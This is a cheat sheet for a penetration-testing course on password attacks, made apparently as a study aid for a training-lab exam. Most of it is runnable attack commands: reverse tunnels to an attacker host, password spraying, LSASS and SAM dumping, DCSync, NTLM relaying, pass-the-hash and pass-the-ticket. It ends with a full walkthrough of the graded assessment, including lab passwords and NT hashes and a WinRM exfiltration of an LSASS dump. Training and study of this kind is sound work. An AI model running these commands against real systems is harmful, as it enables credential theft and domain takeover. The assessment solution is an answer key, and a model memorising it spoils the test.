# Password Attacks — Exam Cheatsheet

**Distilled from HTB Academy Password Attacks module (sections 1–26) + Skills Assessment (Nexura LLC, May 2026).**
Open this during the exam. Sections in the order you'll actually use them.

---

## The Universal Methodology (memorize)

```
1. RECON — find auth surfaces (ssh, smb, winrm, mssql, ftp, web, rdp)
2. USERNAMES — harvest real names → username-anarchy → users.txt
3. SPRAY — small candidate pw list across users (NOT user × rockyou)
4. FOOTHOLD — get one shell / SMB session
5. HUNT  — bash_history, configs, vaults, shares, registry, LSASS
6. REUSE — every cred you find, try across EVERY service & host
7. ESCALATE — local admin → LSASS → domain creds → DCSync
```

> **Forever rule:** Spread first, depth second. One weak password reused everywhere beats one strong crack.

---

## Stage 0 — Pivoting (you will need this on Skills Assessment)

### SSH SOCKS (simplest — use this if you have an SSH foothold)
```bash
sshpass -p 'PASS' ssh -N -D 127.0.0.1:1080 user@DMZ &
```

### Chisel reverse SOCKS
```bash
# Attacker
./chisel server --reverse -p 8080
# Victim
./chisel client ATTACKER:8080 R:1080:socks
```

### Ligolo-ng (preferred for AD)
```bash
# Attacker
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.119.0/24 dev ligolo
./proxy -selfcert
# Agent (victim)
./agent -connect ATTACKER:11601 -ignore-cert
# In proxy console: session → start → 172.16.119.0/24
```

### proxychains-ng config
```
# /tmp/pc.conf
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```
Use: `proxychains -f /tmp/pc.conf nxc smb 172.16.119.0/24 -u U -p P`

> ICMP doesn't tunnel. Use `nc -vz` to test.
> Add `/etc/hosts` for DC names — Kerberos needs hostnames, not IPs.
> Sync clock: `sudo ntpdate DC_IP` (Kerberos KRB_AP_ERR_SKEW).

---

## Stage 1 — Username Harvesting

```bash
# From real names
echo -e "Betty Jayde\nHarry William\nSean Tom" > employees.txt
username-anarchy -i employees.txt > users.txt        # bjayde, jayde, betty.jayde, ...

# Common formats
for n in betty jayde harry william; do
  printf '%s\n%s\n' "$n" "${n:0:1}${n#?}" 
done

# AD enum (if you have any creds)
nxc smb DC -u U -p P --users
nxc ldap DC -u U -p P --users
impacket-GetADUsers -all DOMAIN/USER:PASS -dc-ip DC
```

> Fallback names list: `/usr/share/seclists/Usernames/Names/names.txt` (10713)

---

## Stage 2 — Password Spraying (Stuffing & Defaults — §9)

**Golden rule:** ONE password × MANY users (avoids lockout). Never user × rockyou on AD.

```bash
# Build small candidate list
cat > /tmp/spray.txt <<EOF
Texas123!@#
Welcome1
Password1
Summer2026!
Spring2026!
$COMPANY2026!
Changeme123!
EOF

# SSH
hydra -L users.txt -P /tmp/spray.txt ssh://TARGET -t 4 -f
hydra -L users.txt -P /tmp/spray.txt -s 22 -t 4 -f -o hits.txt ssh://TARGET

# SMB / WinRM / RDP / MSSQL / LDAP (NetExec — preferred)
nxc smb   TARGET -u users.txt -p /tmp/spray.txt --continue-on-success
nxc winrm TARGET -u users.txt -p /tmp/spray.txt --continue-on-success
nxc rdp   TARGET -u users.txt -p /tmp/spray.txt --continue-on-success
nxc mssql TARGET -u users.txt -p /tmp/spray.txt --local-auth --continue-on-success
nxc ldap  DC     -u users.txt -p /tmp/spray.txt --continue-on-success

# AD-aware spray with kerbrute (no logs, fast)
kerbrute passwordspray -d DOMAIN --dc DC users.txt 'Welcome1'

# Domain password policy first! (avoid lockout)
nxc smb DC -u U -p P --pass-pol
```

> `[+]` = valid creds.  `(Pwn3d!)` = local admin.

### Web spraying
```bash
hydra -L users.txt -P spray.txt TARGET https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

---

## Stage 3 — Cracking (the BIG syntax dump)

### John the Ripper — §3
```bash
# Detect & default crack
john hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt --wordlist=rockyou.txt --rules=Jumbo
john --show hashes.txt
john --show --format=NT hashes.txt

# Single-mode (uses GECOS, very effective for /etc/shadow)
john --single hashes.txt

# Incremental (brute) — last resort
john --incremental=Alpha hashes.txt --max-length=8

# Common modes
--format=NT          # NTLM
--format=Raw-MD5
--format=sha512crypt # Linux /etc/shadow $6$
--format=krb5tgs     # Kerberoast
--format=krb5asrep   # AS-REP roast
--format=netntlmv2   # Responder captures
```

### Hashcat — §4
| -m | Hash |
|----|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1100 | Domain Cached (DCC) |
| 2100 | DCC2 (mscash2) |
| 1700 | SHA-512 |
| 1800 | sha512crypt `$6$` |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast TGS |
| 18200 | AS-REP roast |
| 19600 | Kerberos 5 TGS-REP etype 17 |
| 19700 | Kerberos 5 TGS-REP etype 18 |
| 9600 | Office 2013 |
| 13400 | KeePass |

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerb.txt rockyou.txt -r best64.rule -O
hashcat -a 3 -m 1000 hash '?u?l?l?l?l?l?d?d'              # mask
hashcat -a 6 -m 1000 hash rockyou.txt '?d?d?d?d'           # hybrid wl+mask
hashcat --show -m 1000 hashes.txt
hashcat --left -m 1000 hashes.txt
```

**Mask charsets:** `?l`=a-z `?u`=A-Z `?d`=0-9 `?s`=symbols `?a`=all printable

### Custom wordlists & rules — §5
```bash
# Crunch
crunch 8 8 -t @,%%^^ -o words.txt        # @=lower %=digit ,=upper ^=symbol

# CeWL (scrape site)
cewl -d 2 -m 5 -w cewl.txt https://target.com

# Hashcat rules
hashcat --stdout rockyou.txt -r best64.rule | head
# Generate from passwords using Hob0Rules / OneRuleToRuleThemAll

# Mentalist GUI also works for visual rule chains
```

### Protected files — §6, §7
```bash
# Office
office2john Document.docx > o.hash
hashcat -m 9400 o.hash rockyou.txt          # Office 2007
hashcat -m 9500 o.hash rockyou.txt          # Office 2010
hashcat -m 9600 o.hash rockyou.txt          # Office 2013

# PDF
pdf2john secret.pdf > p.hash
hashcat -m 10500 p.hash rockyou.txt         # PDF 1.4-1.6

# ZIP
zip2john archive.zip > z.hash
hashcat -m 13600 z.hash rockyou.txt         # WinZip
hashcat -m 17200 z.hash rockyou.txt         # PKZIP

# 7z / RAR
7z2john arc.7z > a.hash       ; hashcat -m 11600 a.hash rockyou.txt
rar2john arc.rar > r.hash     ; hashcat -m 13000 r.hash rockyou.txt   # RAR5
```

### Password manager vaults — §25 (CRITICAL — Skills26)
```bash
# KeePass
keepass2john Database.kdbx > kp.hash
hashcat -m 13400 kp.hash rockyou.txt

# Password Safe (.psafe3) — THIS WAS THE SKILLS26 ANSWER
pwsafe2john Employee-Passwords_OLD.psafe3 > ps.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ps.hash
# → master pw revealed; open vault with pwsafe-cli or Password Safe GUI

# Bitwarden / 1Password / LastPass — vendor exports + 2john variants exist
# Firefox stored creds
python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE
```
> **Skills26 discipline:** `pwsafe2john + john` is THE intended path. Do NOT chase pypwsafe / Twofish parsers.

---

## Stage 4 — Network Service Attacks — §8
```bash
# RDP
hydra -L users.txt -P spray.txt rdp://TARGET
nxc rdp TARGET -u users.txt -p spray.txt

# SMB
hydra -L users.txt -P spray.txt smb://TARGET
nxc smb TARGET -u users.txt -p spray.txt

# WinRM
nxc winrm TARGET -u users.txt -p spray.txt

# SSH
hydra -L users.txt -P spray.txt ssh://TARGET -t 4

# FTP / POP3 / IMAP / VNC / Telnet
hydra -L users.txt -P spray.txt ftp://TARGET
hydra -L users.txt -P spray.txt pop3://TARGET
hydra -P spray.txt vnc://TARGET                       # vnc has no username

# SNMP (community strings)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET
```

---

## Stage 5 — Windows Credential Access (the meat — §10–§14)

### SAM / SYSTEM / SECURITY — §11 (when local admin)
```bash
# Remote dump via SMB
nxc smb TARGET -u U -p P --sam
nxc smb TARGET -u U -p P --lsa

# Or via secretsdump (impacket)
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
impacket-secretsdump LOCAL/Administrator:PASS@TARGET

# Manual on box
reg save HKLM\SAM      C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM   C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```

### LSASS — §12 (the Skills26 step)
```bash
# Mimikatz (in-memory)
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::dcsync /domain:DOM /user:Administrator

# LOLBin: comsvcs.dll MiniDump (NO Mimikatz on disk) — SKILLS26 PATTERN
nxc winrm TARGET -u U -p P -X \
  'rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full'

# ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse offline
pypykatz lsa minidump lsass.dmp
# look for: NT hash, Kerberos plaintext, AES keys
```

### NTDS.dit — §14 (after DA)
```bash
# Remote DCSync (no shell needed)
impacket-secretsdump DOMAIN/USER:PASS@DC
impacket-secretsdump DOMAIN/USER@DC -hashes :NTHASH
impacket-secretsdump DOMAIN/USER:PASS@DC -just-dc-user Administrator
impacket-secretsdump DOMAIN/USER:PASS@DC -just-dc           # all users
impacket-secretsdump DOMAIN/USER:PASS@DC -ntds ntds.dit -system SYSTEM

# nxc shortcut
nxc smb DC -u U -p P --ntds
nxc smb DC -u U -p P --ntds vss               # via VSS shadow copy
```

### Kerberoast / AS-REP roast (THE go-to AD foothold→privesc)
```bash
# Kerberoast — service accounts with SPNs
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request -outputfile k.hash
hashcat -m 13100 k.hash rockyou.txt -r best64.rule

# AS-REP roast — users with "Do not require Kerberos preauth"
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC -no-pass -format hashcat
hashcat -m 18200 asrep.hash rockyou.txt
```

### Credential Manager — §13
```cmd
:: On box
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all
:: Or via mimikatz
vault::list
vault::cred /patch
```

---

## Stage 6 — Credential Hunting (where Skills26 gets its win)

### Windows hunting — §15
```powershell
# Files with passwords
Get-ChildItem -Recurse -Path C:\Users -Include *.txt,*.xml,*.config,*.ini,*.ps1 -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|passwd"

# Unattend / GPP
type C:\Windows\Panther\unattend.xml
type C:\Windows\System32\sysprep\unattend.xml

# PowerShell history
type (Get-PSReadlineOption).HistorySavePath
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Saved RDP creds
cmdkey /list
```

### Linux hunting — §17 (`.bash_history` was the SKILLS26 KEY)
```bash
cat ~/.bash_history /home/*/.bash_history /root/.bash_history 2>/dev/null
grep -riE 'pass(wd|word)?\s*[:=]' /home/ /etc/ /opt/ /var/ 2>/dev/null
find / -name "*.kdbx" -o -name "*.psafe3" -o -name "id_rsa*" -o -name "*.pem" 2>/dev/null
cat ~/.viminfo                      # recently edited files
sudo -l                             # sudo perms
cat /etc/passwd /etc/shadow 2>/dev/null
```

### Network shares — §19 (Skills26 HR share!)
```bash
# Spider all shares
nxc smb FILE -u U -p P --spider-plus
nxc smb FILE -u U -p P -M spider_plus -o DOWNLOAD_FLAG=True
nxc smb FILE -u U -p P -M spider_plus --pattern "passw|secret|cred"

# Manual recursive download
smbclient //FILE/SHARE -U "DOM/USER%PASS" -c 'prompt OFF; recurse ON; mget *'
smbmap -H FILE -u U -p P -R SHARE --download SHARE/path
snaffler.exe -s -o snaffler.tsv     # Snaffler (top tier)
```

### Network traffic — §18
```bash
# Responder (LLMNR/NBT-NS poisoning → NetNTLMv2)
sudo responder -I tun0 -wd
hashcat -m 5600 net.hash rockyou.txt

# mitm6 (DHCPv6 → WPAD → relay)
mitm6 -d DOMAIN
impacket-ntlmrelayx -tf targets.txt -wh fake-wpad -6

# tcpdump cleartext
tcpdump -i tun0 -A -s0 'port 21 or port 23 or port 80'
```

---

## Stage 7 — Lateral Movement / Pass-the-X

### Pass the Hash — §20
```bash
# nxc (try every host with one NT hash)
nxc smb 172.16.119.0/24 -u Administrator -H NTHASH --local-auth
nxc smb DOMAIN -u USER -H NTHASH                    # domain
nxc winrm TARGET -u USER -H NTHASH

# Impacket
impacket-psexec   DOM/USER@TARGET -hashes :NTHASH
impacket-wmiexec  DOM/USER@TARGET -hashes :NTHASH
impacket-smbexec  DOM/USER@TARGET -hashes :NTHASH
impacket-atexec   DOM/USER@TARGET -hashes :NTHASH 'whoami'

# Evil-WinRM
evil-winrm -i TARGET -u USER -H NTHASH

# RDP PtH (restricted admin must be on)
xfreerdp /v:TARGET /u:USER /pth:NTHASH /cert:ignore
```

> NTHASH = the NT (right-side) part of LM:NT. Always pass with leading `:` to impacket: `-hashes :ntpart`.

### Pass the Ticket (Windows) — §21
```cmd
:: Mimikatz: extract
sekurlsa::tickets /export
:: Inject
kerberos::ptt ticket.kirbi
:: Or Rubeus
Rubeus.exe asktgt /user:USER /rc4:NTHASH /ptt
Rubeus.exe asktgs /service:cifs/dc.dom.local /ticket:base64TGT /ptt
Rubeus.exe s4u /user:WEBSVC$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/dc.dom.local /ptt
```

### Pass the Ticket (Linux) — §22
```bash
# Get TGT from password
impacket-getTGT DOM/USER:PASS -dc-ip DC                   # writes USER.ccache
impacket-getTGT DOM/USER -hashes :NTHASH                  # from hash
impacket-getTGT DOM/USER -aesKey AES256                   # from AES

# Use ticket
export KRB5CCNAME=$PWD/USER.ccache
klist
impacket-wmiexec -k -no-pass DOM/USER@DC.dom.local
impacket-psexec  -k -no-pass DOM/USER@DC.dom.local
impacket-secretsdump -k -no-pass DOM/USER@DC.dom.local

# Convert kirbi <-> ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

### Pass the Certificate — §23
```bash
# Cert → TGT
certipy auth -pfx user.pfx -dc-ip DC                      # gives NT hash + ccache
gettgtpkinit.py DOM/USER -cert-pfx user.pfx -pfx-pass '' user.ccache

# UnPAC-the-hash to get NT
PKINITtools/getnthash.py DOM/USER -key AS_REP_KEY
```

---

## Stage 8 — Password Policies — §24

```bash
# Pull policy BEFORE spraying (don't lock accounts)
nxc smb DC -u U -p P --pass-pol
crackmapexec smb DC -u U -p P --pass-pol
rpcclient -U "" -N DC -c 'getdompwinfo'
net accounts /domain                    # from a domain joined box

# Lockout threshold = 5 → spray ≤4 attempts per user, then wait observation window
```

---

## SKILLS26 — The Full Chain (memorize this exact path)

```
Target: 10.129.X.X (DMZ01 only ext-facing)  →  goal: NEXURA\Administrator NT hash

1.  nmap → only 22/tcp open
2.  username-anarchy on employee names → users.txt
    hydra ssh -L users.txt -P 10k-most-common.txt
    → jbetty : Texas123!@#
3.  ssh in → cat ~/.bash_history → hwilliam credential disclosure
4.  SOCKS pivot: ssh -N -D 1080 jbetty@DMZ
    proxychains-ng (strict_chain, proxy_dns, socks5 127.0.0.1 1080)
5.  proxychains nxc smb 172.16.119.10-11 -u hwilliam -p PW
    proxychains nxc winrm 172.16.119.7 -u hwilliam -p PW
    → reads HR share on FILE01
6.  smbclient //FILE01/HR → mget * → Employee-Passwords_OLD.psafe3
7.  pwsafe2john vault.psafe3 > ps.hash
    john --wordlist=rockyou ps.hash → master = michaeljackson
    open vault → bdavid : caramel-cigars-reply1 (local admin JUMP01)
8.  proxychains nxc winrm 172.16.119.7 -u bdavid -p ... → (Pwn3d!)
9.  LSASS dump via comsvcs.dll MiniDump (LOLBin):
    nxc winrm JUMP01 -u bdavid -p ... -X \
      'rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full'
10. SMB firewalled on JUMP01 → exfil over WinRM:
    Compress-Archive lsass.dmp → lsass.zip
    Read 2MB chunks → base64 → loop → reassemble locally
11. pypykatz lsa minidump lsass.dmp
    → stom NT = 21ea958524cfd9a7791737f8d2f764fa  (Domain Admin)
12. proxychains impacket-secretsdump nexura.htb/stom@DC01 \
      -hashes :21ea958524cfd9a7791737f8d2f764fa -just-dc-user Administrator
    → NEXURA\Administrator NTLM = 36e09e1e6ade94d63fbcab5e5b8d6d23
```

### Skills26 lessons (BURN THESE IN)

1. **One weak SSH password + .bash_history = entire domain.** Always `cat ~/.bash_history` on every Linux foothold.
2. **`pwsafe2john + john`** is THE intended Password Safe path — don't chase exotic parsers.
3. **`comsvcs.dll MiniDump`** is the LOLBin LSASS dump (no Mimikatz on disk).
4. **WinRM as exfil channel** when SMB is firewalled: `Compress-Archive` + base64 chunks via `nxc winrm -X`.
5. **Vault credentials almost always reuse to AD.** Try every vault entry across nxc smb/winrm before doing anything fancy.

---

## STUCK Triage

| Symptom | Fix |
|---------|-----|
| Hydra rate-limited on SSH | switch to POP3 / SMB; lower `-t 4` |
| Spray locking accounts | check `--pass-pol` first, ≤4/user/window |
| `nxc mssql` rejects sa | `sa` disabled — try `--local-auth` with Windows accts |
| Kerberos `KRB_AP_ERR_SKEW` | `sudo ntpdate DC` |
| Kerberos auth fails by IP | use hostname + `/etc/hosts` |
| Impacket "ANONYMOUS LOGON" | wrong cred format — try `DOM/user`, not `DOM\user` |
| Hash won't crack rockyou | run rules: `-r best64.rule -r OneRuleToRuleThemAll.rule` |
| `secretsdump` connect refused | host firewalled SMB — use WinRM via nxc + manual reg save |
| LSASS dump tiny / empty | not running as SYSTEM — escalate or use Token Impersonation |
| `proxychains` ICMP fails | normal, ICMP can't tunnel — use `nc -vz` |
| `evil-winrm` slow download | use compress + base64 chunk pattern |
| pypykatz prints nothing | wrong arch (x86 vs x64), or partial dump — re-dump `full` |

---

## Hash Format Quick-Recognize

| Looks like | Type | -m | john format |
|-----------|------|----|-----|
| `aad3b435...:31d6cfe...` | LM:NT | 1000 (NT) | NT |
| `$1$abc$xyz` | MD5-crypt | 500 | md5crypt |
| `$5$abc$xyz` | SHA256-crypt | 7400 | sha256crypt |
| `$6$abc$xyz` | SHA512-crypt (Linux shadow) | 1800 | sha512crypt |
| `$y$j9T$...` | yescrypt (modern shadow) | – | yescrypt |
| `$krb5tgs$23$*svc*DOM*spn*$...` | Kerberoast TGS | 13100 | krb5tgs |
| `$krb5asrep$23$user@DOM:...` | AS-REP | 18200 | krb5asrep |
| `user::DOM:srvchall:NTLMHASH:blob` | NetNTLMv2 | 5600 | netntlmv2 |
| `$pwsafe$*3*...` | Password Safe v3 | – (use john) | pwsafe |
| `$keepass$*2*...` | KeePass | 13400 | keepass |
| `$office$*2013*...` | Office 2013 | 9600 | office |

Use `hashid hash.txt` or `hash-identifier` if unsure.

---

## Wordlists & Rules

| Path | When |
|------|------|
| `/usr/share/wordlists/rockyou.txt` | Default for everything |
| `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | Quick spray |
| `/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt` | Skills26 used this |
| `/usr/share/seclists/Usernames/Names/names.txt` | Username gen fallback |
| `/usr/share/hashcat/rules/best64.rule` | First rule to try |
| OneRuleToRuleThemAll | Best general rule (download from github/NotSoSecure) |
| `cewl -d 2 https://target.com` | Site-specific |

---

## ACS Series Comparison (for context)

| Module | Foothold | Privesc trick |
|--------|----------|----------------|
| ACS Easy | smtp-user-enum + ftp brute | Core FTP HTTPS path-traversal PUT → SYSTEM |
| ACS Medium | anon-FTP loot → cred reuse | ssh as simon |
| ACS Hard | SMB guest → loot → MSSQL spray | IMPERSONATE + self-linked-server EXEC AT |
| **PA Skills26** | SSH spray + .bash_history | Vault crack → LSASS LOLBin → DCSync |

---

## References

- Full writeup: [class/Skills26_CredentialTheftShuffle.tex](../../../../class/Skills26_CredentialTheftShuffle.tex) (PDF compiled)
- Module section guide: [26-Skills_Assessment.md](26-Skills_Assessment.md)
- LSASS section: [12-Attacking_LSASS.md](12-Attacking_LSASS.md)
- DCSync section: [14-Attacking_Active_Directory_and_NTDS.dit.md](14-Attacking_Active_Directory_and_NTDS.dit.md)
- Cred hunting: [15-Credential_Hunting_in_Windows.md](15-Credential_Hunting_in_Windows.md), [17-Credential_Hunting_in_Linux.md](17-Credential_Hunting_in_Linux.md), [19-Credential_Hunting_Network_Shares.md](19-Credential_Hunting_Network_Shares.md)
- Pass-the-X: [20-Pass_the_Hash.md](20-Pass_the_Hash.md), [21-Pass_the_Ticket_Windows.md](21-Pass_the_Ticket_Windows.md), [22-Pass_the_Ticket_Linux.md](22-Pass_the_Ticket_Linux.md)
